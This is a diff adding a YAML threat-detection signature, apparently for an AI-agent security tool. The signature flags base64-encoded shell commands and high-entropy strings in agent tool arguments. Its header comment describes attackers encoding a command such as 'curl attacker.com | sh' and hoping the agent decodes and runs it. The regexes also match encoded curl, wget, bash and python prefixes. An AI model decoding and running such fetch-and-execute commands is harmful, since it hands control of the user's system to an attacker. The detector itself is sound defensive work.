@@ -1,0 +1,39 @@
+# Detect base64-encoded payloads in tool arguments that decode to shell commands.
+#
+# Attackers encode commands like "curl attacker.com | sh" in base64 and pass them
+# as tool arguments, hoping the agent will decode and execute them.
+# Uses both base64 detection and entropy analysis for double coverage.
+apiVersion: panoptium.io/v1alpha1
+kind: ThreatSignature
+metadata:
+  name: encoded-command-injection
+spec:
+  protocols:
+    - mcp
+    - a2a
+    - gemini
+  category: obfuscation
+  severity: HIGH
+  mitreAtlas: "AML.T0054"
+  description: >-
+    Detects base64-encoded payloads and high-entropy strings in tool arguments,
+    which may indicate obfuscated commands or instructions designed to bypass
+    pattern-based detection.
+  detection:
+    patterns:
+      # Common base64 shell command prefixes (curl, wget, bash, sh, python)
+      - regex: '(?i)(Y3VybC|d2dldC|YmFzaC|c2gg|cHl0aG9u)'
+        weight: 0.8
+        target: tool_args
+      # eval() or exec() with encoded argument
+      - regex: '(?i)(eval|exec)\s*\(\s*[A-Za-z0-9+/]{20,}={0,2}\s*\)'
+        weight: 0.9
+        target: tool_args
+    entropy:
+      enabled: true
+      threshold: 4.8
+      target: tool_args
+    base64:
+      enabled: true
+      minLength: 30
+      target: tool_args
